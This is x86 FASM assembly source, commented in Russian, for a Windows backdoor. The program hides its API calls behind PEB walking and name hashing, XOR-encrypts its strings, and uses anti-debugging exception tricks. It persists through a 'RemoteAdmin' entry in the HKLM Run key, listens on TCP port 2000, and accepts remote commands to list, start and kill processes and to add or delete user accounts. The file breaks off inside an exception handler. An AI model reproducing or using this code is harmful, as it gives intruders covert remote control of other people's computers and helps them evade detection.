format PE console

entry start

include 'C:\fasmw17332\INCLUDE\WIN32AX.INC'

struc WSADATA 
{
	.wVersion 		dw 0x00
	.wHighVersion 	dw 0x00
	.szDescription 	db 258 dup (0x00)
	.szSystemStatus db 129 dup (0x00)
	.iMaxSockets 	dw 0x00
	.iMaxUdpDg 		dw 0x00
	.lpVendorInfo 	dd 0x00
}

struc in_addr 
{
	.s_un 			dd 0x00			; INADDR_ANY
}

struc sockaddr_in
{
	.sin_family 	dw 0x02			; AF_INET
	.sin_port 		dw 0x00
	.sin_addr 		in_addr
	.sin_zero 		db 8 dup (0x00)
}

;---------------------------------------------------------

struc PROCESSENTRY32 
{
	.dwSize					dd 0x0128	; 296 байт
	.cntUsage				dd 0x00
  	.th32ProcessID			dd 0x00
  	.th32DefaultHeapID		dd 0x00
  	.th32ModuleID			dd 0x00
  	.cntThreads				dd 0x00
  	.th32ParentProcessID	dd 0x00
  	.pcPriClassBase			dd 0x00
  	.dwFlags				dd 0x00
  	.szExeFile				db 260 dup (0)
}

struc STARTUPINFOA
{
	.cb 					dd 0x44		; 68 байт
	.lpReserved 			dd 0x00
	.lpDesktop 				dd 0x00
	.lpTitle 				dd 0x00
	.dwX 					dd 0x00
	.dwY 					dd 0x00
	.dwXSize 				dd 0x00
	.dwYSize 				dd 0x00
	.dwXCountChars 			dd 0x00
	.dwYCountChars 			dd 0x00
	.dwFillAttribute 		dd 0x00
	.dwFlags 				dd 0x00
	.wShowWindow 			dw 0x00
	.cbReserved2 			dw 0x00
	.lpReserved2 			dd 0x00
	.hStdInput 				dd 0x00
	.hStdOutput 			dd 0x00
	.hStdError 				dd 0x00
}

struc PROCESS_INFORMATION
{
	.hProcess				dd 0x00
	.hThread				dd 0x00
	.dwProcessId			dd 0x00
	.dwThreadId				dd 0x00
}

;---------------------------------------------------------

struc USER_INFO_1
{
	.usri1_name 		dd 0x00	; укзатель на строку юникодв
	.usri1_password 	dd 0x00	; укзатель на строку юникодв
	.usri1_password_age dd 0x00
	.usri1_priv 		dd 0x01	; USER_PRIV_USER
	.usri1_home_dir 	dd 0x00
	.usri1_comment 		dd 0x10001	;UF_SCRIPT | UF_DONT_EXPIRE_PASSWD
	.usri1_flags 		dd 0x00
	.usri1_script_path 	dd 0x00
}

;---------------------------------------------------------

EXCEPTION_MAXIMUM_PARAMETERS = 15
MAXIMUM_SUPPORTED_EXTENSION  = 512
SIZE_OF_80387_REGISTERS      = 80

struct FLOATING_SAVE_AREA
  ControlWord          dd ?
  StatusWord           dd ?
  TagWord              dd ?
  ErrorOffset          dd ?
  ErrorSelector        dd ?
  DataOffset           dd ?
  DataSelector         dd ?
  RegisterArea         rb SIZE_OF_80387_REGISTERS
  Cr0NpxState          dd ?
ends

struct CONTEXT
  ContextFlags         dd ?
  iDr0                 dd ?
  iDr1                 dd ?
  iDr2                 dd ?
  iDr3                 dd ?
  iDr6                 dd ?
  iDr7                 dd ?
  FloatSave            FLOATING_SAVE_AREA
  regGs                dd ?
  regFs                dd ?
  regEs                dd ?
  regDs                dd ?
  regEdi               dd ?
  regEsi               dd ?
  regEbx               dd ?
  regEdx               dd ?
  regEcx               dd ?
  regEax               dd ?
  regEbp               dd ?
  regEip               dd ?
  regCs                dd ?
  regFlag              dd ?
  regEsp               dd ?
  regSs                dd ?
  ExtendedRegisters    rb MAXIMUM_SUPPORTED_EXTENSION
ends

struct EXCEPTION_RECORD
  ExceptionCode        dd ?
  ExceptionFlags       dd ?
  pExceptionRecord     dd ?
  ExceptionAddress     dd ?
  NumberParameters     dd ?
  ExceptionInformation rd EXCEPTION_MAXIMUM_PARAMETERS
ends

struct EXCEPTION_POINTERS
   pExceptionRecord    dd ?
   pExceptionFrame     dd ?
   pExceptionContext   dd ?
   pParam              dd ?
ends

;---------------------------------------------------------
a1 = sehTF			; это чтобы в pe файле функции оказались
a2 = sehDr7
a3 = sehSetTF

szBuffer = 0x200			; 512 байт

offset_sehTF 	= 0x0767
offset_sehDr7 	= 0x07a0
offset_sehSetTF = 0x07dd

section '.idata' import data readable
	library kernel32, 'kernel32.dll'
	
	import kernel32,\
			GetStdHandle, 'GetStdHandle',\
			WriteConsoleA, 'WriteConsoleA',\
			ExitProcess, 'ExitProcess'
			
section '.data' data readable writeable
	buffer db szBuffer dup (0x00)		; буфер общего назначения
	filename dd 0x00					; адрес названия файла
	sbuf db 0x10 dup (0x00)				; вспомогательный буфер
	
	; Сетевое взаимодействие
	WSAData WSADATA
	servInfo sockaddr_in
	serv_socket dd 0x00
	client_conn dd 0x00	
	
	; Взаимодействие с процессами
	hSnapshot dd 0x00
	pe32 PROCESSENTRY32
	prinfo PROCESS_INFORMATION
	stinfo STARTUPINFOA
	
	; Взаимоодействие с пользователями
	userInfo USER_INFO_1
	; буферы под юникод строки 
	unicode_username db 50 dup (0x00)	
	unicode_password db 50 dup (0x00)
	
	; Взаимодействие с реестром
	hKey dd 0x00	; дескриптор ключа
	szModuleFileNameA dd 0x00		; размер строки в буфере
	
	; Адреса таблиц функций загруженных dll
	addr_kernel32_table	dd 0x00			; адрес таблицы функций kernel32.dll
	addr_ws2_32_table	dd 0x00			; адрес таблицы функций ws2_32.dll
	addr_samcli_table	dd 0x00			; адрес таблицы функций samcli.dll
	addr_advapi32_table	dd 0x00			; адрес таблицы функций advapi32.dll
	
	; Строки
	ws2_32 db 0x4E, 0x4A, 0x0B, 0x66, 0x0A, 0x0B, 0x17, 0x5D, 0x55, 0x55, 0x39		;ws2_32.dll\0 по xor 0x39
	samcli db 0x4a, 0x58, 0x54, 0x5a, 0x55, 0x50, 0x17, 0x5d, 0x55, 0x55, 0x39 ; samcli.dll\0 по xor 0x39
	advapi32 db 0x58, 0x5d, 0x4f, 0x58, 0x49, 0x50, 0x0a, 0x0b, 0x17, 0x5d, 0x55, 0x55, 0x39 ; advapi32.dll\0 по xor 0x39
	mesComNotFound db 0x7a, 0x56, 0x54, 0x54, 0x58, 0x57, 0x5d, 0x19, 0x57
					db 0x56, 0x4d, 0x19, 0x5f, 0x56, 0x4c, 0x57, 0x5d, 0x39
	mesComError db 0x7a, 0x56, 0x54, 0x54, 0x58, 0x57, 0x5d, 0x19, 0x5c, 0x4b, 0x4b, 0x56, 0x4b, 0x39
	value_name db 0x6b, 0x5c, 0x54, 0x56, 0x4d, 0x5c, 0x78, 0x5d, 0x54, 0x50, 0x57, 0x39 ; RemoteAdmin
	reg_path db 0x6a, 0x76, 0x7f, 0x6d, 0x6e, 0x78, 0x6b, 0x7c, 0x65, 0x74, 0x50
			db 0x5a, 0x4b, 0x56, 0x4a, 0x56, 0x5f, 0x4d, 0x65, 0x6e, 0x50, 0x57, 0x5d
			db 0x56, 0x4e, 0x4a, 0x65, 0x7a, 0x4c, 0x4b, 0x4b, 0x5c, 0x57, 0x4d, 0x6f
			db 0x5c, 0x4b, 0x4a, 0x50, 0x56, 0x57, 0x65, 0x6b, 0x4c, 0x57, 0x39 ; SOFTWARE\Microsoft\Windows\CurrentVersion\Run
			
	
	mesNoResult db 0x01
	mesMore db 0x02			; означает, что после будут передаваться список

	VA_exe dd 0x00		; VA загрузки приложения
	VA_text_section	dd 0x00 			; VA секции .text
	
	; Патчинг файла
	hCode dd 0x00 				; дескриптор :code
	hPatch dd 0x00				; дескриптор :patch
	addr_patch_buf dd 0x00		; адрес буфера
	
	compressed_patch: file 'packed.bin'
	szCompressed_patch dd $ - compressed_patch
	
	offset_get_func_addr 		dd 0xF3		; смещение в секции .text
	offset_send 				dd 0x0112	; смещение в секции .text
	offset_zeroBuffer 			dd 0x0138	; смещение в секции .text
	offset_next_accept 			dd 0x047c	; смещение в секции .text	
	offset_close_client_conn 	dd 0x0702	 ; смещение в секции .text
	
	; Таблица функций приложения. 
	; Запись = [хеш от имени: 4 байта, криптограмма смещения в секции .text: 4 байта]
	; Конец таблицы - нулевая запись
	my_func_table 	dd 0x25400080, 0x00000b50			; exit
					dd 0x24000085, 0x0d2000e4			; end
				
					dd 0x2000008B, 0xa764008a			; pwd
					dd 0x600000A0, 0x00000c00			; cd [название]
					dd 0x2F06007C, 0xdf66cabe			; mkdir [название]
				
					dd 0x000000B8, 0x000d18b8			; ps
					dd 0x98000090, 0x96f09890			; run [название]
					dd 0x34000079, 0x340794e3			; term [PID]
					
					dd 0xC10E7404, 0x8d1e9c37			; addUser
					dd 0xC10E8974, 0x289ac564			; delUser
					dd 0x00, 0x00

section '.text' code readable executable

; ======= ФУНКЦИЯ ПОЛУЧЕНИЯ VA ЗАГРУЗКИ МОДУЛЯ =======
; IN	al - флаг, ищем dll или exe
; IN 	cx - сумма символов названия dll
; OUT 	ebx - VA загрузки dll 
proc get_VA_module
	mov ebx, [fs:0x30]			; peb
	
	mov ebx, [ebx + 0x0C]		; peb_ldr_data
	mov ebx, [ebx + 0x14]		; inMemoryOrderModuleList (first)
	
	cmp al, 0x01				; если нужен VA exe
	je .get_moduleBase
	
.find_module:
	mov esi, [ebx + 0x20]		; FullDllName

.calc_checksum:
	xor edx, edx
	
.iter:
	lodsw
	
	cmp ax, 0x00
	je .check
	
	cmp ax, 0x5c
	je .calc_checksum
	
	add dx, ax
	jmp .iter
	
.check:
	cmp dx, cx					; сумма символов названия dll			
	je .get_moduleBase
	
	mov ebx, [ebx]
	jmp .find_module
	
	
.get_moduleBase:
	mov ebx, [ebx + 0x10]		; dllBase VA
	
	ret
endp
; ====================================================

; ======= ФУНКЦИЯ ХЕШИРОВАНИЯ НАЗВАНИЯ ФУНКЦИИ =======
; IN 	esi - адрес строки
; IN	[esp + 4] - символ конца строки
; OUT 	edx - криптограмма
proc get_hash_func_name
	xor eax, eax
	xor edx, edx
	
	mov ecx, 0
.calc_hash:
	lodsb 
	cmp al, byte [esp + 4]
	je .save_hash
	
	inc ecx						; с 1 до длины имени
	add edx, eax				; прибавляем букву
	ror edx, cl
	add edx, eax				; прибавляем букву
	xor edx, ecx				
	
	jmp .calc_hash

.save_hash:
	ret 0x04
endp
; ====================================================


; ----------------------------------------------------------
; Запись [хеш от имени: 4 байта, криптограмма VA: 4 байта]
; Конец таблицы - нулевая запись
; ----------------------------------------------------------
; ======= ФУНКЦИЯ ЗАПОЛНЕНИЯ ТАБЛИЦЫ ФУНКЦИЙ В СТЕКЕ =======
; IN 	ebx - VA загрузки dll
; OUT 	eax - VA начала таблицы
proc create_table
	; Сохраняем адрес возврата
	mov edi, [esp]	
	add esp, 0x04
	
	; Получаем VA структуры _IMAGE_EXPORT_DIRECTORY
	mov esi, [ebx + 0x3C]		; RAW _IMAGE_NT_HEADERS (e_lfanew)
	lea esi, [ebx + esi]		; VA _IMAGE_NT_HEADERS
	mov esi, [esi + 0x78]		; RVA _IMAGE_EXPORT_DIRECTORY 
	add esi, ebx				; VA _IMAGE_EXPORT_DIRECTORY
	
	; Получаем размер массива AddressOfNames
	mov ecx, [esi + 0x18]		; NumberOfNames
	
	; Резервируем место в стеке под таблицу
	mov edx, ecx
	inc ecx						; для того, чтобы выделить место нулевую запись
.reserve_stack:
	push 0x00					; место под хеш названия фукнции 		
	push 0x00					; место под криптограмму VA функции	
	loop .reserve_stack
	mov ecx, edx	
	
	; Сохраняем адрес возврата 
	push edi
	
	; Сохраняем в стек VA массивов структуры _IMAGE_EXPORT_DIRECTORY
	mov edx, [esi + 0x1C]		; RVA массива AddressOfFunctions
	add edx, ebx				; VA массива AddressOfFunctions
	push edx
	mov edx, [esi + 0x24]		; RVA массива AddressOfNameOrdinals
	add edx, ebx				; VA массива AddressOfNameOrdinals
	push edx
	mov edx, [esi + 0x20]		; RVA массива AddressOfNames
	add edx, ebx				; VA массива AddressOfNames
	push edx
	
; Состояние программы 
; Регистры:
; ebx 			VA загрузки dll
; ecx 			количество элементов в AddressOfNames
; Стек:
; [esp + 0x00]	VA массива AddressOfNames
; [esp + 0x04]	VA массива AddressOfNameOrdinals 
; [esp + 0x08]	VA массива AddressOfFunctions
; [esp + 0x0C]	VA возврата
; [esp + 0x10]	начало таблицы 
	
	; Заполняем таблицу
.fill_table:
	dec	ecx	
	
	; Получаем VA названия функции
	mov esi, [esp]				; VA массива AddressOfNames
	mov esi, [esi + ecx*0x04]	; RVA строки названия функции
	add esi, ebx				; VA строки названия функции
	
	; Создаем хеш названия функции
	push ecx					; сохраняем зн ecx
	push 0x00					; символ конца строки
	call get_hash_func_name
	pop ecx 					; достаем зн ecx
	
	; Сохраняем хеш
	lea edi, [esp + 0x10 + ecx*0x08]	; VA записи в таблице
	mov [edi], edx				; сохраняем хеш
	
	; sehTF
	; изменяем регистр eflags	
	pushfd
	or dword [esp], 0x100
	popfd
	
	nop
	call end_prog ; завершаем работу seh
	
	; Получаем индекс фукнции
	mov esi, [esp + 0x04]				; VA массива AddressOfNameOrdinals 
	movzx eax, word [esi + ecx*0x02]	; получаем индекса функции
	
	; Получаем криптограмму VA функции
	mov esi, [esp + 0x08]				; VA массива AddressOfFunctions
	mov esi, [esi + eax*0x04]			; RVA функции
	
	lea edi, [esp + 0x14 + ecx*0x08]	; адрес сохранения криптограммы VA функции
	add esi, [edi - 0x04]				; прибавляем к RVA хеш
	add esi, ebx						; RVA функции + хеш + VA загрузки
	
	push ecx 					; сохраняем зн ecx
	
	mov ecx, [edi - 0x04]		; хеш
	ror esi, cl					; ror (RVA функции + хеш + VA загрузки) на байт хеша
	xor esi, ecx				; xor (ror (RVA функции + хеш + VA загрузки) на байт хеша) и хеша
	mov [edi], esi				; сохранение криптограммы VA функции
	
	pop ecx						; достаем зн ecx
	
	inc ecx
	loop .fill_table
	
	lea eax, [esp + 0x10]		; начало таблицы 
	add esp, 0x0C				; освобождаем места VAes массивов структуры _IMAGE_EXPORT_DIRECTORY
	
	ret
endp
; ==========================================================

; ======= ФУНКЦИЯ XOR СТРОКИ ПО 0X39 =======
; IN 	esi - VA строки
proc xor_0x39_string
	push eax					; сохраняем зн eax

.iter:
	lodsb 						; считываем байт
	cmp al, 0x00
	je .exit_iter_e				; конец строки при шифровании
	
	xor al, 0x39
	mov [esi - 1], al			; сохраняем полученное значение
	cmp al, 0x00
	jne .iter
	jmp .exit_iter_d			; конец стрки при дешифровании
	
.exit_iter_e:
	xor al, 0x39				; ксорим 0x00
	mov [esi - 1], al			; сохраняем полученное значение
	
.exit_iter_d:
	pop eax
	ret
endp
; ==========================================

; ======= ФУНКЦИЯ ПОЛУЧЕНИЯ АДРЕСА ФУНКЦИИ (В .DATA И СТЕКЕ) =======
; IN 	esi - адрес начала таблицы
; IN 	ebx - хеш названия фукнции
; OUT 	eax - адрес функции (0x00 - адрес не найден)
proc get_func_addr
.find_func_addr:
	lodsd						; считываем хеш 
	
	cmp eax, 0x00				; проверка на конец таблицы
	jne .not_end	
	
	xor eax, eax				; подготовка результата 0x00
	jmp .ret_zero
	
.not_end:
	cmp eax, ebx				; сверка хешей
	je .ret_addr
	
	add esi, 0x04				; адрес следующей записи в таблице
	jmp .find_func_addr
	
.ret_addr:
	lodsd						; криптограмма адреса (xor (ror (адрес функции + хеш) на байт хеша) и хеша)
	
	xor eax, ebx				; получаем ror (адрес функции + хеш) на байт хеша
	
	push ecx					; сохраняем зн ecx
	mov cl, bl
	rol eax, cl					; получаем адрес функции + хеш

	sub eax, ebx				; получаем адрес функции
	pop ecx						; достаем зн ecx
	
.ret_zero:
	ret
endp
; ==================================================================

; ======= ФУНКЦИЯ ОТПРАВКИ СООБЩЕНИЯ =======
; IN 	ecx - длина строки
; IN 	edx - VA строки
; OUT 	eax - результат работы функции
proc send
	; Получаем VA send
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x63400077	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	push 0x00					; flags
	push ecx					; len
	push edx					; buf
	push [client_conn]			; s
	call eax					; send
	ret
endp
; ==========================================

; ======= ФУНКЦИЯ ОЧИСТКИ БУФЕРА =======
proc zeroBuffer
	push ecx 
	push esi
	
	mov ecx, szBuffer
	mov esi, buffer
.clear:
	lodsb
	mov byte [esi - 0x01], 0x00
	loop .clear
	
	pop esi
	pop ecx 
	ret
endp
; ======================================

; ======= ФУНКЦИЯ ПРОПИСКИ В РЕЕСТРЕ =======
proc regedit
	; Получаем VA GetModuleFileNameA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x99D392D6		
	call get_func_addr
	
	push szBuffer
	push buffer
	push 0x00
	call eax 
	
	test eax, eax
    jz .ret
	
	inc eax
	mov dword [szModuleFileNameA], eax
	
	mov esi, reg_path
	call xor_0x39_string
	
	; Открываем ветку реестра HKLM\Software\Microsoft\Windows\CurrentVersion\Run
	; Получаем VA RegOpenKeyExA
	mov esi, [addr_advapi32_table]
	mov ebx, 0xFA89D079		
	call get_func_addr
	
	push hKey			; phkResult
	push 0x20006		; samDesired 
	push 0x00 			; ulOptions
	push reg_path		; lpSubKey
	push 0x80000002		; hKey HKEY_LOCAL_MACHINE
	call eax
	
	test eax, eax
    jnz .ret_1
	
	mov esi, value_name
	call xor_0x39_string
	
	; Добавляем значение в реестр
	; Получаем VA RegSetValueExA
	mov esi, [addr_advapi32_table]
	mov ebx, 0x5949D72		
	call get_func_addr
	
	push [szModuleFileNameA]	; cbData
    push buffer					; lpData
    push 0x01					; dwType REG_SZ
    push 0x00					; Reserved	
	push value_name				; lpValueName
    push [hKey]					; hKey
    call eax
	
    test eax, eax
    jnz .ret_2
	
    ; Закрываем ключ реестра	
	; Получаем VA RegCloseKey
	mov esi, [addr_advapi32_table]
	mov ebx, 0xFDC1C2DC		
	call get_func_addr
	
	push [hKey]
    call eax
	
.ret_2:
	mov esi, value_name
	call xor_0x39_string	
	
.ret_1:
	mov esi, reg_path
	call xor_0x39_string

.ret:
	ret
endp
; ==========================================

start:
	nop

; ========== ПОДГОТОВКА ПРИЛОЖЕНИЯ К РАБОТЕ ========== 

	; Получаем VA загрузки exe
	mov al, 0x01
	call get_VA_module
	mov dword [VA_exe], ebx
	
	; Получаем VA секции .text
	add ebx, 0x01D4				; RAW информации RVA секции .text
	mov eax, dword [ebx]
	add eax, dword [VA_exe]
	mov dword [VA_text_section], eax
	
	; Получаем VA загрузки kernel32.dll
	xor al, al
	mov cx, 0x0450
	call get_VA_module
	
	; установка обработчика
	mov ecx, offset_sehTF
	add ecx, [VA_text_section]
	push ecx
    push dword[fs:0]              
    mov dword[fs:0],esp 
	
	; Заполняем в стеке таблицу функций kernel32.dll
	call create_table
	mov [addr_kernel32_table], eax
; --------------------------------------------------------------	
	; Получаем VA LoadLibraryA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x65F790A2
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
		
	; Расшифровываем строку ws2_32.dll
	mov esi, ws2_32
	call xor_0x39_string
	
	; Загружаем ws2_32.dll
	push ws2_32					; lpLibFileName
	call eax					; LoadLibraryA
	
	; Зашифровываем строку ws2_32.dll
	mov esi, ws2_32
	call xor_0x39_string
	
	cmp eax, 0x00
	je end_prog					; ошибка в LoadLibraryA
	
	; установка обработчика
	mov ecx, offset_sehDr7
	add ecx, [VA_text_section]
	push ecx   
    push dword[fs:0]              
    mov dword[fs:0],esp 
	
	; Заполняем в стеке таблицу функций ws2_32.dll
	mov ebx, eax				; VA загрузки dll
	call create_table
	mov [addr_ws2_32_table], eax
; --------------------------------------------------------------    
	; Получаем VA LoadLibraryA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x65F790A2
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	; Расшифровываем строку samcli.dll
	mov esi, samcli
	call xor_0x39_string
	
	; Загружаем samcli.dll
	push samcli				; lpLibFileName
	call eax					; LoadLibraryA
	
	; Зашифровываем строку samcli.dll
	mov esi, samcli
	call xor_0x39_string
	
	cmp eax, 0x00
	je end_prog					; ошибка в LoadLibraryA
	
	; Заполняем в стеке таблицу функций samcli.dll
	mov ebx, eax				; VA загрузки samcli.dll
	call create_table
	mov [addr_samcli_table], eax
; --------------------------------------------------------------
	; Получаем VA LoadLibraryA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x65F790A2
	call get_func_addr
	
	pushfd
	
	cmp eax, 0x00
	je end_prog
	
	popfd
	
	; Расшифровываем строку advapi32.dll
	mov esi, advapi32
	call xor_0x39_string
	
	pushfd
	pushfd
	
	; Загружаем advapi32.dll
	push advapi32				; lpLibFileName
	call eax					; LoadLibraryA
	
	add esp, 0x08
	
	; Зашифровываем строку advapi32.dll
	mov esi, advapi32
	call xor_0x39_string
	
	cmp eax, 0x00
	je end_prog					; ошибка в LoadLibraryA
	
	; установка обработчика
	mov ecx, offset_sehSetTF
	add ecx, [VA_text_section]
	push ecx    
    push dword[fs:0]              
    mov dword[fs:0],esp 
	
	; Заполняем в стеке таблицу функций advapi32.dll
	mov ebx, eax				; VA загрузки advapi32.dll
	call create_table
	mov [addr_advapi32_table], eax
	
	pushfd
	; Прописываемся в реестре
	call regedit    
	sub esp, 0x04
	add esp, 0x08
; ========== БЛОК ПРИЕМА И ОБРАБОТКИ ПОДКЛЮЧЕНИЙ ========== 
; Инициализация сокетных интерфейсов
	; Получаем VA WSAStartup
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x5B8C778F		
	call get_func_addr
	 
	; sehTF
	; изменяем регистр eflags	
	pushfd
	xor edx, edx
	mov dword [edx], 0x01
	popfd
	
	nop
	call close_client_conn ; завершаем работу seh


next_instr1:
	cmp eax, 0x00
	je end_prog
	
	pushfd 
	
	push WSAData				; lpLibFileName
	xor ecx, ecx
	mov cx, 0x0202
	push ecx					; lpLibFileName
	call eax					; WSAStartup
	
	popfd
	
	cmp eax, 0x00
	jne end_prog				; ошибка WSAStartup  
; --------------------------------------------------------------
; Создание и инициализация сокета
	; sehDr7
	xor dl, dl
	div dl
	
	; Получаем VA socket
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x7463C871			; socket
	call get_func_addr

	cmp eax, 0x00
	je clean_WSAData
	
	push 0x06					; protocol = IPPROTO_TCP
	push 0x01					; type = SOCK_STREAM
	push 0x02					; af = AF_INET
	call eax					; socket
	
	cmp eax, 0x00
	je clean_WSAData			; ошибка socket
	mov [serv_socket], eax
; --------------------------------------------------------------
; Привязка сокета к паре ip порт
	; Получаем VA bind
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x77800077			
	call get_func_addr

	; sehTF
	; изменяем регистр eflags	
	pushfd
	xor edx, edx
	mov dword [edx], 0x01
	popfd
	
	nop
	call close_client_conn ; завершаем работу seh

	cmp eax, 0x00
	je close_serv_sock
	
	mov [servInfo.sin_port], 0x7D0	; port (dec 2000)
	push 0x10						; namelen (размер struc sockaddr_in)
	push servInfo					; *addr
	push [serv_socket]				; s
	call eax						; bind
	
	cmp eax, 0x00
	jne close_serv_sock			; ошибка bind
; --------------------------------------------------------------
; Прослушивание порта
	; Получаем VA listen
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x5CB04077		
	call get_func_addr
	
	cmp eax, 0x00
	je close_serv_sock
	
	pushfd 
	pushfd 
	
	push 0x01					; backlog (длина очереди)
	push [serv_socket]			; s
	call eax					; listen
	
	add esp, 0x0C
	sub esp, 0x04
	
	cmp eax, 0x00
	jne close_serv_sock			; ошибка listen 
; --------------------------------------------------------------
; Подтверждение подключения
next_accept:
	; Получаем VA accept
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x98EA3871			
	call get_func_addr
	
	cmp eax, 0x00
	je close_serv_sock
		
	push 0x00					; *addrlen
	push 0x00					; *addr
	push [serv_socket]			; s
	call eax					; accept
	
	cmp eax, 0x00
	je close_serv_sock			; ошибка accept
	mov [client_conn], eax
; --------------------------------------------------------------
; Обработка подключения
process_connection:
	pushfd 
; Немного ждем клиента
	; Получаем VA Sleep
	mov esi, [addr_kernel32_table]
	mov ebx, 0x3D160072	
	call get_func_addr
	
	popfd
	
	cmp eax, 0x00
	je close_client_conn
	
	push 0x0190					; dwMilliseconds (400мс)
	call eax					; Sleep	
; --------------------------------------------------------------
; Отправка приглашения в консоли
	call zeroBuffer				; очистка буфера
	
	; Получаем offset pwd
	mov esi, my_func_table
	mov ebx, 0x2000008B	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	pushfd 
	pushfd 
	
	add eax, [VA_text_section]	; получаем VA функции
	call eax
	
	add esp, 0x08
	
	cmp eax, 0x00
	je close_client_conn		; ошибка pwd
	
	; Формируем строку и отправляем
	dec eax
	mov esi, buffer
	add esi, eax
	mov byte [esi], 0x3A		; ':'
	inc esi
	mov byte [esi], 0x20		; ' '
	add esi, 0x02
	sub esi, buffer
	mov ecx, esi
	mov edx, buffer
	call send
	
	pushfd
	
	cmp eax, 0x00
	jge get_command		
	
	popfd
	
	; ошибка send
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	add eax, [VA_text_section]	; получаем VA функции
	call eax
			
; --------------------------------------------------------------
; Получение команды
get_command:
	popfd
	
	; sehDr7
	xor dl, dl
	div dl
	
	call zeroBuffer
	; Получаем VA recv
	mov esi, [addr_ws2_32_table]
	mov ebx, 0xDB800081			
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	push 0						; flags
	push 0x0200					; len
	push buffer					; *buf
	push [client_conn]			; s
	call eax					; recv
	
	cmp eax, 0x00
	jge process_command		
	
	; ошибка recv 
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	add eax, [VA_text_section]	; получаем VA функции
	push eax
	ret
	
; --------------------------------------------------------------
; Обработка команды
process_command:
	mov esi, buffer
	
	; sehTF
	; изменяем регистр eflags	
	pushfd
	or dword [esp], 0x100
	popfd
	
	nop
	call close_client_conn ; завершаем работу seh

find_space:
	lodsb 
	cmp al, 0x00
	je if_zero
	
	cmp al, 0x20
	je if_space
	jmp find_space

if_zero:
	push 0x00					; конец строки
	jmp call_hash
	
if_space:
	push 0x20					; конец строки
	
call_hash:
	mov esi, buffer
	call get_hash_func_name
	
	cmp edx, 0xB562F7F3			; хеш addFunc
	je addFunc
	
	cmp edx, 0xB5630D63			; хеш delFunc
	je delFunc
	
	mov ebx, edx				; хеш для get_func_addr (1)
	push esi 					; сохраняем зн регистра esi
	
	; sehDr7
	xor dl, dl
	div dl
	
	; Находим смещение функции в секции кода
	mov esi, my_func_table
	; т.е. для этого (1)
	call get_func_addr
	
	pop esi						; достаем зн регистра esi
	
	cmp eax, 0
	je command_not_found		; отправка сообщения об ошибки
; --------------------------------------------------------------
; Вызов команд
	add eax, [VA_text_section]		; получение VA функции 
	call eax
	
	cmp eax, 0x00
	je command_error			; если функция завершилась ошибкой 
	
	cmp ebx, 0x00				; нужен ли вывод результата команды
	jne if_result
	
	mov ecx, 0x01
	mov edx, mesNoResult		; байт 0x01 означает, что функция на вывод ничего не имеет
	
	jmp send_result
	
if_result:
	mov ecx, eax				; это для получения пути
	mov edx, buffer	
	
send_result:
	call send	
	
	cmp eax, 0x00
	jge process_connection
	
	; если send завершилась ошибкой 
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	; sehDr7
	xor dl, dl
	div dl
	
	add eax, [VA_text_section]	; получаем VA функции
	call eax	

	
; --------------------------------------------------------------
command_not_found:
	call zeroBuffer				; очистка буфера
	
	; Расшифровываем сообщение
	mov esi, mesComNotFound
	call xor_0x39_string
	
	; Отправляем сообщение
	mov ecx, 0x12
	mov edx, mesComNotFound
	call send					
	
	; Зашифровываем сообщение
	mov esi, mesComNotFound
	call xor_0x39_string
	
	; sehDr7
	xor dl, dl
	div dl
	
	cmp eax, 0x00
	jge process_connection		; обарбатываем следующую команду					
	
	; ошибка send 
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	add eax, [VA_text_section]	; получаем VA функции
	push eax
	ret
; --------------------------------------------------------------
command_error:
	call zeroBuffer				; очистка буфера
	
	; Расшифровываем сообщение
	mov esi, mesComError
	call xor_0x39_string
	
	mov ecx, 0x0E
	mov edx, mesComError
	call send					
	
	; Зашифровываем сообщение
	mov esi, mesComError
	call xor_0x39_string
	
	cmp eax, 0x00
	jge process_connection	; обарбатываем следующую команду
	
	; ошибка send
	; Получаем offset exit
	mov esi, my_func_table
	mov ebx, 0x25400080	
	call get_func_addr
	
	cmp eax, 0x00
	je close_client_conn
	
	add eax, [VA_text_section]	; получаем VA функции
	push eax
	ret		
	
	
	
	
	
; ========== БЛОК ЗАВЕРШЕНИЯ РАБОТЫ ПРИЛОЖЕНИЯ ==========
close_client_conn:
	; Получаем VA closesocket
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x4561D811			
	call get_func_addr
	
	cmp eax, 0x00
	je close_serv_sock	
	
	push [client_conn]			; s
	call eax					; closesocket

close_serv_sock:
	; Получаем VA closesocket
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x4561D811		
	call get_func_addr
	
	cmp eax, 0x00
	je clean_WSAData
	
	push [serv_socket]			; s
	call eax					; closesocket

clean_WSAData:
	; Получаем VA WSACleanup
	mov esi, [addr_ws2_32_table]
	mov ebx, 0x1143B4EE	
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	call eax					; WSACleanup
	
end_prog:
	; Получаем VA ExitProcess
	mov esi, [addr_kernel32_table]
	mov ebx, 0xC6974388	
	call get_func_addr
	
	push 0
	call eax			


; ========== БЛОК ОБРАБОТЧИКОВ ОШИБОК ==========	
; Обработчик TF
; IN eax - откуда продожить выполнение
proc sehTF pRecord, pFrame, pContext, pParam
	mov esi, [pRecord]
	cmp [esi + EXCEPTION_RECORD.ExceptionCode], 0x80000004	
